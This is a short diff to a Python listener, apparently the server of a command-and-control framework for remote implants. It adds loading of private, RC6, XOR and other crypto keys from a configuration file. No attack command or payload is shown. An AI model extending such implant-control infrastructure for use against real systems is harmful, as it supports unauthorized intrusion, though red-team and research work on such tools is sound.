@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
 
 import asyncio
+import ast
 import argparse
 from threading import Thread
+
 from lib import logging
 from lib import listening_post
 
@@ -23,6 +25,13 @@ class Listener(object):
         self.addr = args['address']
         self.port = args['port']
         self.config = args['config']
+
+        # Crypto values
+        self.initial_private_key = args['config']['crypto']['private_key']
+        self.initial_public_key = self.initial_private_key.public_key
+        self.initial_rc6_key = args['config']['crypto']['sym_key']
+        self.xor_key = ast.literal_eval(args['config']['crypto']['xor_key'])
+        self.ts_pubkey = args['config']['crypto']['ts_pk']
 
         # Implant Runtime Vars
         self.implants = {}
